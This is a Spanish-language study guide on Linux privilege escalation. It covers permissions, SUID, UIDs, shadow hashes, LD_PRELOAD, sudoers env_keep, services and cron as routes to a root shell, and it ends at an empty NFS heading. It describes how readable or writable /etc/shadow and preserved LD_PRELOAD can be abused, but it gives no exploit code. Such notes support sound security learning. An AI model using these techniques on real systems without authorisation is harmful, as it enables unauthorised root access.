---
description: '"Hacking is not about exploits, hacking is using what you have"'
---

# Elevación de privilegios en Linux

## Objetivo

El objetivo de realizar una escalada de privilegios no es otro que obtener una shell de root en el sistema. Para conseguir este fin puede ser tan fácil como usar un exploit de kernel, que el usuario root tenga como password toor o que se necesiten encadenar varios errores de configuración.

No existe un método 100% seguro que nos de root en la máquina, no lo hay. La clave esta en enumerar, enumerar aún más y pensar que podemos hacer con toda la información que encontramos.

## Referencias

Los recursos consultados para llevar a cabo esta recopilación son:

* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation)
* [https://blog.carreralinux.com.ar/](https://blog.carreralinux.com.ar/)
* [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
* [https://gtfobins.github.io](https://gtfobins.github.io/)
* [https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)
* [https://www.udemy.com/course/linux-privilege-escalation/](https://www.udemy.com/course/linux-privilege-escalation/)

## Algo de teoría y conceptos clave

### Kernel y Userspace

Un sistema Linux tiene tres niveles:

* Hardware: Memoria, discos, dispositivos...
* Kernel: Core del sistema operativo. Reside en la memoria y le dice a la CPU que ha de hacer. El kernel es un interfaz entre el hardware y cualquier programa en ejecución
* User space: Los programas que utiliza el usuario final, tales como las "shell" u otras aplicaciones con ventanas. Como es lógico estas aplicaciones necesitan interaccionar con el hardware del sistema, pero no lo hacen directamente, sino a través de las funciones que soporta el kernel.

#### Kernel

Principalmente se encarga de 4 tareas:

* Procesos: Determina que proceso "puede" acceder a la CPU y utilizarla. Gestiona el estado de cada proceso.
* Memoria: Controla, supervisa y gestiona toda la memoria principal
* Device drivers: El Kernel actúa como una interfaz entre el hardware \(como un disco\) y los procesos.
* System calls and supports: Los procesos utilizan system call para comunicarse con el kernel y poder realizar determinadas acciones. Por ejemplo, fork, exec, read, write.

#### Userspace

Debido a que un proceso es simplemente una imagen en memoria, userspace también se refiere a todos los procesos de usuario en ejecución en memoria.

Realmente, mucha de la acción que pasa en el sistema, se corresponde a procesos de user space. Sin embargo, no hay que olvidar que al final todo esta relacionado: Por ejemplo, un web browser es un proceso de usuario pero por debajo estará trabajando con el kernel space que se encarga de "hablar" con los buses de comunicación, la red etc

Así que en el espacio de usuario:

* Es donde las aplicaciones de los usuarios son ejecutadas.
* Tambiín es donde se encuentra la libreria GNU C \(glibc\)

#### Diferencia esencial

El kernel se ejecuta en modo "kernel mode" y tiene acceso "total" al procesador y a la memoria principal. Por lo tanto, es el dueño y señor del sistema. A la area donde solo puede acceder el Kernel se denomina Kernel Space

En cambio, los procesos que se ejecutan en user space se ejecutan de forma "restringida" y solo acceden a un espacio limitado de memoria y se limitan a operaciones en CPU "seguras".

Por lo tanto, si un proceso en user space se pudre, es fácil que no tumbes el sistema, simplemente el kernel se hará cargo de ese proceso y lo "limpiara".

#### Glibc

Glibc es la librería C proporciona y define las llamadas al sistema y otras funciones básicas utilizada por casi todos los programas como open, malloc, printf, etc. La librería C es utilizada por todos los programas enlazados dinámicamente. En los sistemas Linux se instala con el nombre de libc6.

De la fuente original \([https://www.gnu.org/software/libc/](https://www.gnu.org/software/libc/)\):

_The GNU C Library project provides the core libraries for the GNU system and GNU/Linux systems, as well as many other systems that use Linux as the kernel. These libraries provide critical APIs including ISO C11, POSIX.1-2008, BSD, OS-specific APIs and more. These APIs include such foundational facilities as open, read, write, malloc, printf, getaddrinfo, dlopen, pthread\_create, crypt, login, exit and more._

_The GNU C Library is designed to be a backwards compatible, portable, and high performance ISO C library. It aims to follow all relevant standards including ISO C11, POSIX.1-2008, and IEEE 754-2008._

_The project was started circa 1988 and is almost 30 years old._

**System calls**

Una system call \(llamada al sistema\) es un punto de entrada controlado al kernel, permitiendo a un proceso solicitar que el kernel realice alguna operación en su nombre. El kernel expone una gran cantidad de servicios accesibles por un programa via el application programming interface \(API\) de system calls.

Algunas características generales de las system calls son:

* Una system call cambia el modo del procesador de user mode a kernel mode, por ende la CPU podrá acceder al area protegida del kernel. El conjunto de system calls es fijo. Cada system call esta identificada por un único numero, que por supuesto no es visible al programa, este sólo conoce su nombre.
* Cada system call debe tener un conjunto de parámetros que especifican la información que debe ser transferida desde el user space al kernel space.

Entonces, lo que se hace es que se utilizan las funciones de glibc como "wrapper" para las syscall. Se utiliza una función de la librería que, entre bambalinas, prepara el terreno para que la syscall que toque tenga a su disposición todos los parámetros adecuados. El procesador pasa entonces de usermode a kernel mode, realiza la "operación" retorna el resultado y vuelve a usermode.

### Gestión de permisos

Los permisos en Linux básicamente establecen una relación entre los usuarios, los ficheros y los directorios.

* ¿Quién?: Usuario, grupo, otros
* ¿Qué acciones?: Lectura, escritura, ejecución
* ¿Dónde puede hacer las acciones? : Fichero o directorio

#### Usuarios

* El identificador de usuario es un componente necesario en sistemas de archivos y procesos Unix. Están definidos en /etc/passwd
* Los usuarios son identificados mediante su user ID \(UID\)
* Hay usuario privilegiado denominado superusuario, normalmente a este usuario privilegiado se le identifica con el nombre de root.
* El rango de los valores de los UID varía entre los diferentes sistemas estando como mínimo comprendidos entre 0 y 32767.
* El superusuario debe tener siempre UID 0.
* Al usuario nobody siempre se le asigna por tradición el UID más alto posible \(como oposición al superusuaio\). Normalmente, se le asigna el 32767.
* Recientemente, a los usuarios se les asigna un UID dentro del rango del sistema, 1–1000, o en el rango 65530–65535.
* Los UID entre 1 y 1000 son reservados normalmente para que los use el sistema.
* Algunos manuales también recomiendan que sean reservados los UID entre el 499 y el 511.
* La lista de todos los UID de los usuarios se encuentran en el archivo /etc/passwd.
* Actualmente, \(2020\) Linux empieza a crear los usuarios desde el UID 1000

#### Groups

* Definidos en /etc/group
* Un usuario tiene un grupo principal _\(por defecto, el grupo principal de un usuario tiene el mismo nombre que el usuario\)_

#### Files y Directories

* Cada fichero y directorio tiene como propietario a un usuario y un grupo concretos
* Los permisos de los ficheros y los directorios se dividen en 3 bloques: usuarios, grupos y otros

#### Permisos de ficheros

Los permisos básicos son: read, write y execute

#### Permisos de directorios

En el caso de los directorios, los permisos son los mismos pero con ciertas apreciaciones:

* Execute: Se puede acceder al directorio
* Read: El directorio puede ser listado
* Write: Se pueden crear ficheros y subdirectorios

#### Gestión de los permisos

Tres instrucciones controlan los permisos asociados a un archivo:

* Chown: Cambia el dueño de un archivo;
* Chgrp: Modifica el grupo dueño;
* Chmod: Cambia los permisos del archivo

Hay dos formas de representar permisos:

* La representación simbólica es probablemente la más sencilla de entender y recordar. Se pueden definir los permisos para cada categoría \(u/g/o\) definiéndolos explícitamente:

  * Dejar igual \(=\)
  * Agregar permisos \(+\)
  * Eliminar \(-\) permisos.

  Por lo tanto, la fórmula u=rwx,g+rw,o-r hace lo siguiente: El dueño tendrá permisos de lectura, escritura y ejecución, el grupo propietario ahora añadirá permisos de lectura y escritura y se eliminara el permiso de lectura para los otros usuarios.

  Los permisos que no son modificados cuando se agregan o eliminan se mantienen . La letra a \(por «all»\) incluye las tres categorías de usuarios, por lo que a=rx otorga los mismos permisos \(lectura y ejecución, pero no escritura\) a las tres categorías de usuario.

* La representación numérica \(octal\) asocia cada permiso con un valor:

  * 4 para lectura
  * 2 para escritura
  * 1 para ejecución.

  Asociamos cada combinación de permisos con la suma de dichos valores.

#### Permisos especiales

Los permisos especiales que nos interesan son:

* Setuid\(suid\): El fichero se puede ejecutar con los permisos del propietario del fichero
* Setgid\(sgid\): El fichero sera ejecutado con los privilegios de grupo El bit setgid también funciona en directorios. Cualquier elemento creado en el directorio será asignado automáticamente al grupo dueño del directorio padre en lugar de heredar el grupo principal de su creador.

Además también esta el bit «sticky» \(representado por la letra «t»\). Es un permiso que sólo es útil en directorios. Se usas especialmente en directorios temporales a los que todos tienen permisos de escritura \(como /tmp/\). Se restringe la eliminación de archivos para que sólo pueda hacerlo el dueño del mismo \(o el dueño del directorio padre\). Sin este bit activado, cualquier podría eliminar los archivos de otros usuarios en /tmp/.

Para representar permisos especiales, puede agregar un cuarto dígito antes que los demás donde los bits setuid, setgid y «sticky» son, respectivamente, 4, 2 y 1. Por ejemplo:

* chmod 4754 asociará el bit setuid con los permisos descritos anteriormente.
* u+s: setuid
* g+s: setgid
* o+t: sticky

#### Obtener los permisos de los ficheros/directorios

Instrucción ls:

Ejemplo:

* ls -halt /:
  * h: human readable
  * a: all
  * l: long list
  * t: time

En la respuesta el primer carácter indica que es:

* \(-\): file
* d: directory

### Ficheros /etc/passwd y /etc/shadow

#### Fichero /etc/passwd

En el fichero /etc/passwd se registran los usuarios del sistema:

* ,,,,,,

El significado del campo "password":

* X-&gt; El password esta almacenado en /etc/shadow
* !-&gt; Usuario bloqueado
* !!-&gt; No tiene password

El significado del campo "uid":

* root:o
* Usuarios de servicio: 1-999
* Usuarios: 1000-65535

El significado del campo "shell":

* Si el usuario tiene permisos limitados, no debe de tener shell: /usr/bin/nologin o /bin/false

#### Fichero /etc/shadow

En el fichero /etc/shadow se encuentran los hashes de los passwords de los usuarios. Nadie excepto root lo puede leer, pero:

* Si se puede leer se podría llegar a crackear el password de root
* Si se puede llegar a escribir se podría reemplazar el hash del usuario root por un hash conocido

La estructura es la siguiente:&lt;1&gt;&lt;2&gt;&lt;3&gt;&lt;4&gt;&lt;5&gt;&lt;6&gt;

1. Días transcurridos desde 1-1-1970 donde el password fue cambiado por última vez.
2. El mínimo número de días entre cambios de contraseña.
3. Días máximos de validez de la cuenta.
4. Días que avisa antes de caducar la contraseña.
5. Días después de que un password caduque para deshabilitar la cuenta
6. Fecha de caducidad. días desde 1-1-1970, donde la cuenta es deshabilitada y el usuario no podrá iniciar sesión

**Cifrado de password en linux**

Para cifrar el password se utiliza una función estandar de C crypt basada en el algoritmo DES.

Un ejemplo:

_root:$6$HMYZvkDT6BLDaeYV$8nhWca.zdlvtl7ZqA/YoMk454U45VVRR9F4.5M7ceLeIgCoa1WPgCznRd3t82sLHU/6dXnb2tIHD.QFisH1gd1:18308:0:99999:7::_:

* $6$-&gt;El numero indica el tipo de cifrado.
  * $1$=MD5 \(22 caracteres\)
  * $2$=blowfish
  * $5$=SHA-256 \(43 Caracteres\)
  * $6$=SHA-512 \(86 Caracteres\)
* La cadena "HMYZvkDT6BLDaeYV": Bits salt para incorporar aleatoriedad

Se puede replicar el proceso de la siguiente manera:

_root@kali:/sbin\# mkpasswd -m sha-512 toor HMYZvkDT6BLDaeYV_: $6$HMYZvkDT6BLDaeYV$8nhWca.zdlvtl7ZqA/YoMk454U45VVRR9F4.5M7ceLeIgCoa1WPgCznRd3t82sLHU/6dXnb2tIHD.QFisH1gd1

### Directorio Proc

El directivo proc contiene una jerarquía de archivos especiales que representan el estado actual del kernel. Se puede encontrar una ran cantidad de información con detalles sobre el hardware del sistema y cualquier proceso que se esté ejecutando. Los directorios que estan nombrados con un número se denominan directorios de proceso, ya que pyeden hacer referencia al ID de proceso y contener información especifica para ese proceso.

Cada uno de los directorios de procesos contiene los siguientes archivos:

* cmdline: Contiene el comando que se ejecutó cuando se arrancó el proceso.
* cwd: Enlace simbólico al directorio actual en funcionamiento para el proceso.
* environ: Le da una lista de variables de entorno para el proceso. La variable de entorno viene dada toda en mayúsculas y el valor en minúsculas.
* exe: Enlace simbólico al ejecutable de este proceso.
* fd: Directorio que contiene todos los descriptores de archivos para un proceso en particular. Vienen dados en enlaces numerados.
* maps: Contiene mapas de memoria para los diversos ejecutables y archivos de bibliotecas asociados con este proceso. Este archivo puede ser bastante largo, dependiendo de la complejidad del proceso
* mem: Memoria del proceso.
* root: Enlace al directorio root del proceso.
* stat: Estado del proceso.
* statm: Estado de la memoria en uso por el proceso.
* status: Proporciona el estado del proceso en una forma mucho más legible que stat o statm.

### Tipos de usuarios en linux

En Linux un usuario tiene un identificador de usuario \(UID\) y pertenece a un grupo \(GID\). Dos instrucciones especialmente importantes son:

* Setuid \(suid\): Set User ID
* Setgid \(sgid\): Group ID

#### Usuario real y usuario efectivo

Antes de nada, UID= Identificador de usuario. A partir de aquí:

RUID es el ID de usuario real y casi nunca cambia. Todos los procesos que inicien desde una shell heredarán su RUID. Un proceso sin privilegios de root puede enviar señales a otro proceso si este tiene el mismo ruid o euid. Por eso procesos hijos pueden comunicarse con su proceso padre.

EUID es el ID efectivo de usuario. Normalmente el uid y el euid van a coincidir pero serán diferentes si el bit suid esta activado. El UID efectivo de un proceso se usa para la mayoría de las verificaciones de acceso. También se usa como propietario de los archivos creados por el proceso.

Por lo tanto, cuando un binario tiene suid activado, este usa su propio EUID al ser ejecutado para acceder a los archivos del sistema. Se utiliza para permitir que usuarios no privilegiados puedan acceder a tareas que requieren de root. Un ejemplo es el comando passwd para modificar la contraseña, /etc/shadow no está accesible desde usuarios no privilegiados. Los ficheros creados no tendrán el EUID del fichero si no el RUID del fichero que ejecutó el binario con setuid activo.

Un ejemplo, espero que más fácil de entender: Si un usuario U1 ejecuta un programa P que pertenece a otro usuario U2 y que tiene activo el bit suid entonces el proceso asociado a la ejecución de P por parte de U1 va a cambiar su euid y va a tomar el valor del uid del usuario U2. Es decir, a efectos de comprobación de permisos sobre P, U1 va a tener los mismos permisos que tiene el usuario U2. Para el identificador de grupo efectivo egid se aplica la misma norma.

En resumen. el ID del usuario real es el UID que arranca \(y el propietario\) del proceso. El UID efectivo es el ID bajo el que se ejecuta el proceso con todo lo que ello comporta a nivel de permisos y comunicaciones.

### Variables de entorno

Las variables de entorno permiten almacenar configuraciones globales para la consola u otros programas ejecutados \(objetos en memoria que pueden ser referenciadas por una o más aplicaciones\). Son contextuales \(cada proceso tiene su propio conjunto de variables de entorno\) pero heredables. Esta última característica ofrece la posibilidad a una consola de inicio de sesión de declarar variables que serán pasadas a todos los programas que ejecute.

_"Una variable de entorno es un objeto que contiene datos utilizados por una o más aplicaciones. En términos simples, se trata de una variable con un nombre y un valor"._

Especialmente interesante es la variable PATH que mantiene los system paths que son usados por la shell \(bash\) para buscar ejecutables. lo interesante es que la búsqueda se realiza mediante el orden de los paths

Funciones que consultan PATH:

* system\(\)
* popen\(\)
* execlp\(\)
* execvp\(\)
* execvpe\(\)

Instrucciones clave relacionadas con las variables de entorno:

* env: Listar las variables de entorno actuales
* Set
* Set Variable=Valor
* Echo $nombre\_variable: Mostrar el valor de una variable \(echo $PATH\)

Modificar el path, o mejor dicho, complementar:

* PATH=$PATH:/nuevo path
* export $PATH

### Ficheros de configuración de bash y profile

* Solo existe una sola copia de los archivos **/etc/profile** y **/etc/bashrc**.
* Cada usuario tiene su propia copia de los archivos **.bashrc** y **.bash\_profile**. \(Estos archivos se encuentran en el directorio personal de cada usuario \(~\). El punto hace que estos archivos sean ocultos. Para ver si los tiene pruebe:
* Los archivos **/etc/profile** y **/etc/bashrc** afectan a todos los usuarios.Por tanto son gestionados por el administrador del sistema \(root\).
* Como cada usuario tiene su propia copia de los archivos **.bashrc** y **.bash\_profile**, su copia le pertenece y se la puede autogestionar. Para acceder a su archivo pruebe en la linea de comandos:
* **/etc/profile** --&gt; Se ejecuta cuando cualquier usuario inicia la sesión. **/etc/bashrc** --&gt; Se ejecuta cada vez que cualquier usuario ejecuta el programa bash
* **~/.bash\_profile** --&gt; Se ejecuta el .bash\_profile de juanito cuando juanito inicia su sesión. **~/.bashrc** --&gt; Se ejecuta el .bashrc de juanito cuando juanito ejecuta el programa bash.
* cat /etc/profile: The `/etc/profile` file is not very different however it is used to set system wide environmental variables on users shells.
* cat /etc/bashrc: This file is meant for setting command aliases and functions used by bash shell users

The difference between when these two files are executed are dependent on the type of login being performed. In Linux you can have two types of login shells, Interactive Shells and Non-Interactive Shells. An Interactive shell is used where a user can interact with the shell, i.e. your typical bash prompt. Whereas a non-Interactive shell is used when a user cannot interact with the shell, i.e. a bash scripts execution.

The difference is simple, the `/etc/profile` is executed only for interactive shells and the `/etc/bashrc` is executed for both interactive and non-interactive shells. In fact in Ubuntu the `/etc/profile` calls the `/etc/bashrc` directly.

### Librerías compartidas

Las librerías compartidas en Linux consisten en archivos individuales que contienen una lista de funciones. Este conjunto suele recibir el nombre de API \(Appplication Programme Interface\) y esta disponible para cualquier programa que lo necesite. Las librerías compartidas se cargan al iniciar un programa.

En Linux, las librerías compartidas aparecen en forma de archivos .so \(shared objects\) y están en:

* /lib: librerías esenciales para el funcionamiento del sistema
* /lib64: igual que antes, pero sistemas de 64 bits

En sistemas modernos que usan systemd, en realidad la ubicación /libX es un enlace a /usr/lib

Para saber que librerías esta utilizando un programa:

* ldd

Los responsables de encontrar y buscar los objetos compartidos que necesita el programa son los programas ld.so y ld.linux.so. Una vez encuentran los shared object, estos son "cargados" , se prepara el entorno y se ejecuta el proceso.

#### LD\_PRELOAD/LD\_LIBRARY\_PATH

LD\_PRELOAD es una variable de entorno de uso opcional. Contiene la ubicación de bibliotecas u objetos compartidos que tendrán más prioridad que las ubicadas en las rutas estándar, incluida la biblioteca de tiempo de ejecución de C \(libc.so\). A esta funcionalidad se le denomina precargar librerías es decir, ell loader cargara primero estas librerias y dejara todo el entorno listo para, ahora si, la ejecución normal del proceso.

El hecho de hacer esta "precarga" significa que las funciones de esta librería se usarán antes que otras del mismo nombre en bibliotecas posteriores. Esto permitiría que las funciones de la biblioteca sean interceptadas y reemplazadas \(sobrescritas\). Como resultado, el comportamiento del programa puede modificarse de forma no invasiva, es decir, no es necesaria una recopilación.

LD\_LIBRARY\_PATH es una variable de entorno que contiene un conjunto de directorios donde se buscan primero las bibliotecas compartidas.

### Sudo

_"Sudo allows a permitted user to execute a command as the superuser or another user, as specified by the security policy"_

Las instrucciones clave de sudo son:

* sudo: Ejecutar un programa con sudo
* sudo -u: Ejecutar un programa como un usuario especifico
* sudo -l: Listar los programas
* sudo -v: Obtener la version de sudo

No confundir sudo con su \(cambiar de usuario\):

* su - usuarioA

Una vez ejecutado el comando pedirá la contraseña del "usuarioA". El guion \(-\) permite el inicio de un nuevo shell de conexión con las preferencias del usuario miusuario. Si omite el guion no se cargará la sesión desde el directorio home del usuario en cuestión y no se inicializarán las variables de preferencia para ese usuario \(HOME, SHELL, USER, LOGNAME and PATH\).

Si ejecuta el comando su o su - por sí solo, sin especificar ningún usuario, se _invoca_ al usuario root.

#### Archivo sudoers y visudo

A través del archivo /etc/sudoers, el administrador del sistema puede especificar una serie de comandos que un usuario dado puede ejecutar con privilegios administrativos. A pesar de tratarse de un archivo de texto plano NO debe editarse utilizando un editor de texto directamente, sino que debe hacerse mediante el comando **visudo**.

Con visado se abrirá el archivo en modo de edición pero con la ventaja que al mismo tiempo bloqueará el acceso a otro usuario que intente editarlo. Además, al guardar los cambios se llevara a cabo un revisión para identificar posibles errores de sintaxis en el archivo.

Para entender el fichero sudoers:

_User privilege specification_

_root ALL=\(ALL:ALL\) ALL_

_Allow members of group sudo to execute any command_

_%sudo ALL=\(ALL:ALL\) ALL_

* QUIÉN DÓNDE=\(COMO QUIÉN\) QUÉ
  * Quién: A que usuarios o alias se refiere la directiva.
  * Dónde: Si esta la palabra "ALL" significa el equipo donde estamos conectados
  * Como quién: Indica la cuenta de usuario a la que "ascenderemos" para realizar QUÉ
* Para añadir a un usuario al grupo sudo:
  * Adduser 'user' sudo

#### Consideraciones de sudo + variables de entorno + librerías compartidas

Los programas al ejecutar sudo puede heredar las variables de entorno desde el entorno de usuario.

Dado que sudo sera invocado por un usuario para hacer una elevación a root, sudo ejecutara el programa en un "nuevo" entorno, que no heredara las variables de entorno del usuario que lo invoca, hará un reset por seguridad, no sea caso que alguna variable lleve regalo. Esto sucederá así si la opción env\_reset esta activada en el fichero /etc/sudoers.

La explicación oficial resumida es:

_If set, sudo will reset the environment to only contain the LOGNAME, SHELL, USER, USERNAME and the SUDO_\* _variables_._Any variables in the caller’s environment that match the env\_keep and env\_check lists are then added. The default contents of the env\_keep and env\_check lists are displayed when sudo is run by root with the -V option. If the secure\_path option is set, its value will be used for the PATH environment variable. This flag is on by default._

Y una explicación oficial más extensa:

_Since environment variables can influence program behavior, sudoers_ provides a means to restrict which variables from the user's environment are inherited by the command to be run. There are two distinct ways _sudoers_ can deal with environment variables.

_By default, the env\_reset_ option is enabled. This causes commands to be executed with a new, minimal environment. On AIX \(and Linux systems without PAM\), the environment is initialized with the contents of the /etc/environment file. On BSD systems, if the _use\_loginclass_ option is enabled, the environment is initialized based on the _path_ and _setenv_ settings in /etc/login.conf. The new environment contains the `TERM`, `PATH`, `HOME`, `MAIL`, `SHELL`, `LOGNAME`, `USER`, `USERNAME` and `SUDO_*` _variables in addition to variables from the invoking process permitted by the env\_check_ and _env\_keep_ options. _This is effectively a whitelist for environment variables_. _Environment variables with a value beginning with `()` are removed unless both the name and value parts are matched by env\_keep_ or _env\_check_, as they will be interpreted as functions by older versions of the **bash** shell. Prior to version 1.8.11, such variables were always removed

_If, however, the env\_reset_ option is disabled, any variables not explicitly denied by the _env\_check_ and _env\_delete_ options are inherited from the invoking process. _In this case, env\_check_ and _env\_delete_ behave like a blacklist. _Environment variables with a value beginning with `()` are always removed, even if they do not match one of the blacklists_._Since it is not possible to blacklist all potentially dangerous environment variables, use of the default env\_reset_ behavior is encouraged

_Environment variables to be preserved in the user's environment when the env\_reset_ option is in effect. This allows fine-grained control over the environment `sudo`-spawned processes will receive. The argument may be a double-quoted, space-separated list or a single value without double-quotes. The list can be replaced, added to, deleted from, or disabled by using the `=`, `+=`, `-=`, and `!` operators respectively. The default list of variables to keep is displayed when `sudo` is run by root with the `-V` option.

Pero, hay una manera de conservar las variables de entorno del usuario para que se conserver en el nuevo entorno, es la variable \(env\_keep\).

* env\_keep: Permite definir las variables de entorno que se conservarán en el entorno del usuario cuando la opción “env\_reset” esté activada en “/etc/sudoers” . Por ejemplo, la variable “LD\_PRELOAD”. Esto estará indicado de la siguiente manera: env\_keep += LD\_PRELOAD
* Si esta opción esta activa en el fichero sudoers, y recordemos que LD\_PRELOAD no deja de ser una ubicación de librerías, por lo que cuando un usuario ejecute un programa con sudo, sudo hara la precarga de dichas librerías y dejara el entorno listo para la ejecución del proceso.

### Servicios

#### Arranque del sistema - El proceso Init

¿Qué sucede cuando arranca Linux?

1. La BIOS toma el control del equipo, se encarga de reconocer todos los dispositivos necesarios para cargar el sistema operativo en la RAM. La idea básica es que detecta los discos, carga el registro maestro de arranque \(MBR\) y ejecuta el gestor de arranque \(GRUB\).
2. El gestor de arranque busca el Kernel de Linux, lo carga en memoria y lo ejecuta
3. El kernel carga la partición que contiene el sistema de archivos y ejecuta el primer programa init.
4. Una vez el núcleo Linux tiene control del sistema \(lo cual sucede una vez lo ha cargado el gestor de arranque\) prepara las estructuras de memoria y los controladores. Es entonces cuando le pasa el control a una aplicación \(normalmente init\) cuya tarea es preparar el sistema y asegurarse de que, al final de proceso de arranque, todos los servicios necesarios están corriendo y el usuario puede entrar en el sistema.
5. Para los sistemas en los que todos los ficheros y herramientas necesarios residen en el mismo sistema de archivos, la aplicación init puede perfectamente controlar el proceso de inicio subsiguiente. Sin embargo cuando se definen múltiples sistemas de archivos \(o se realizan instalaciones más raras\) el tema se complica un poco:
6. Cuando la partición /usr está en un sistema de archivos separado, las herramientas y controladores que tienen ficheros almacenados en /usr no se pueden utilizar a menos que /usr esté disponible. Si estas herramientas son necesarias para hacer que /usr esté disponible entonces no se puede arrancar el sistema.
7. Si el sistema de archivos raíz está cifrado, entonces el kernel podrá encontrar la aplicación init y el sistema no arrancara.
8. La solución a este problema ha sido desde hace tiempo utilizar initramfs
9. Initramfs es un sistema de archivos ram de inicio basado en tmpfs \(un sistema de ficheros de tamaño flexible y ligero que se carga en memoria\). Contiene las herramientas y guiones necesarios para montar el sistema de archivos antes de que se lance el binario init en el sistema de archivos raíz real. Estas herramientas pueden ser capas de abstracción de descifrado, gestores de volúmenes lógicos, software raid, cargadores de sistemas de ficheros basados en controladores bluetooth, etc. El contenido del sistema de archivos initramfs se obtiene creando un fichero cpio
10. Todos los ficheros, herramientas, bibliotecas, ajustes de configuración \(si son aplicables\), etc se ponen dentro del archivo cpio. Este archivo entonces se comprime mediante la utilidad gzip y es almacenado junto con el kernel. El cargador de arranque entonces se lo ofrecerá al kernel en el momento del inicio de modo que el kernel sepa que tiene un compi para arrancar el sistema.
11. Una vez detectado, el Kernel creará un sistema de ficheros tmpfs, extraerá el contenido del archivo en él y a continuación lanzará el init localizado en el raíz del sistema de ficheros tmpfs. Este montara el sistema "real"
12. Una vez se han montado el sistema de ficheros raíz y el resto de sistemas de fichero vitales, el init del sistema de ficheros initramfs cambiará el raíz al sistema de ficheros raíz real y finalmente llamará al binario /sbin/init \(enlace simbólico a /lib/systemd/systemd\) en ese sistema para continuar el proceso de arranque. El trabajo de Init es "conseguir que todo funcione como debe ser" una vez que el kernel está totalmente en funcionamiento. En esencia, establece y opera todo el espacio de usuario.

#### Systemd

Es el sistema de inicio de linux y además es el "gestor" de daemons del sistema. La otra alternativa, ya un poco más old es el System V y sus niveles de ejecución. Si bien han habido bastantes quejas sobre la complejidad de systemd y la simpleza de System V , todo hay que decirlo.

Bien, systemd es el primer programa en levantarse y el último en irse a dormir. Sus ficheros más importantes son:

* /lib/systemd/system/ y /etc/systemd/system/

Para interactuar con systemd, y por ende, con los daemons, lo mejor es utilizar la utilizad systemctl:

* systemctl sin argumentos: Listado de todos los servicios del sistema y su estado, excepto los deshabilitados
* systemctl status: Muestra una vision mejor de los servicios y sus procesos relacionados
* systemctl status nombre del servicio.service: Para tener mas detalle de un servicio.
* systemctl start nombredelservicio.service: Para arrancar un servicio. Y por deducción, systemctl stop, systemctl reload y systemctl restart
* systemctl enable nombre.service: Para establecer el arranque del servicio desde el inicio
* system disable: Obvio

#### Daemon

Procesos \(servicios\) que se ejecutan en background. Normalmente se inician cuando arranca Linux, son autónomos y van tareas periódicas o recibiendo inputs si es necesario, pero en general no son interactivos ya que no tienen interacción con el usuario. Su principal objetivo es ofrecer "servicios/ayudas" al resto del sistema.

Algunos servicios famosetes:

* sshd
* nfsd
* apache2
* exim4

Tradicionalmente en sistemas UNIX y derivados los nombres de los demonios terminan con la letra d. Por ejemplo syslogd es el demonio que implementa el registro de eventos del sistema, mientras que sshd es el que sirve a las conexiones SSH entrantes.

En general, los demonios se arrancan en modo root \(ojo, que entonces tienen acceso a todos los recursos del sistema\) y luego hacen un downgrade de permisos.

**Inetd**

Inetd es un demonio presente en la mayoría de sistemas tipo Unix, conocido como el "Super Servidor de Internet", ya que gestiona las conexiones de varios demonios. Atiende las solicitudes de conexión que llegan a nuestro equipo, y está a la espera de todos los intentos de conexión que se realicen en una máquina.

El archivo /etc/inetd.conf enumera estos "servicios servidores" y sus puertos usuales. El programa inetd escucha en todos estos puertos y cuando detecta una conexión a uno de ellos ejecuta el programa servidor correspondiente.

**Udev**

Udev es el gestor de dispositivos que usa el kernel Linux en su versión 2.6. Su función es controlar los ficheros de dispositivo en /dev. Es el sucesor de devfs y de hotplug, lo que significa que maneja el directorio /dev y todas las acciones del espacio de usuario al agregar o quitar dispositivos, incluyendo la carga de firmwares

El subsistema hotplug del núcleo administra dinámicamente el agregar y eliminar dispositivos mediante la carga de los controladores apropiados y la creación de los archivos de dispositivo correspondientes \(con la ayuda de udevd\). Con el hardware moderno y la virtualización, casi todo puede ser conectado en caliente: desde los periféricos USB/PCMCIA/IEEE 1394 usuales hasta discos duros SATA, pero también la CPU y la memoria.

El kernel tiene una base de datos que asocia cada ID de dispositivo con el controlador necesario. Se utiliza esta base de datos durante el inicio para cargar todos los controladores de los periféricos detectados en los diferentes canales, pero también cuando se conecta un dispositivo en caliente. Una vez el dispositivo está listo para ser utilizado se envía un mensaje a udevd para que pueda crear los elementos correspondientes en /dev/.

Cuando el núcleo le informa a udev de la aparición de un nuevo dispositivo, recolecta mucha información sobre el dispositivo consultando los elementos correspondientes en /sys/; especialmente aquellos que lo identifican unívocamente \(dirección MAC para una tarjeta de red, número de serie para algunos dispositivos USB, etc.\).

Con esta información, udev luego consulta todas las reglas en /etc/udev/rules.d y /lib/udev/rules.d. En este proceso decide cómo nombrar al dispositivo, los enlaces simbólicos que creará \(para darle nombres alternativos\) y los programas que ejecutará. Se consultan todos estos archivos y se evalúan las reglas secuencialmente \(excepto cuando un archivo utiliza la directiva «GOTO»\). Por lo tanto, puede haber varias reglas que correspondan a un evento dado.

### Cron

Es un demonio \(proceso en segundo plano\) que se ejecuta desde el mismo instante en el que arranca el sistema. Comprueba si existe alguna tarea \(_job_\) para ser ejecutado de acuerdo a la hora configurada en el sistema.. Estas tareas se ejecutan con los permisos del usuario al que pertenecen.

Los ficheros donde podemos ver que tareas hay programadas son:

* /var/spool/cron/ \(se asume que se genera un fichero crontab por cada usuario \)
* /var/spool/cron/crontabs
* /etc/crontab \(se asume que también es el usado por el user root\)

#### Crontab

Un archivo de texto. Aunque es verdad que se trata de un archivo con contenido especial. Posee una lista con todos los _scripts_ a ejecutar. Generalmente cada usuario del sistema posee su propio fichero Crontab. Se considera que el ubicado en la carpeta **etc** pertenece al usuario **root**.

#### Variables de Cron

El demonio cron establece automáticamente varias variables de entorno.

* La ruta predeterminada se establece en RUTA = / usr / bin: / bin. Si el comando que se está ejecutando no está presente en la ruta cron especificada, se puede usar la ruta absoluta al comando o cambiar la variable cron $ PATH. No se puede agregar implícitamente: $ PATH como se haría en un script normal.
* El shell predeterminado se establece en / bin / sh. Para cambiar a otra shell diferente, se usa la variable SHELL.
* Cron invoca el comando desde el directorio de inicio del usuario. La variable HOME se puede establecer en el crontab.

### Network File System \(NFS\)

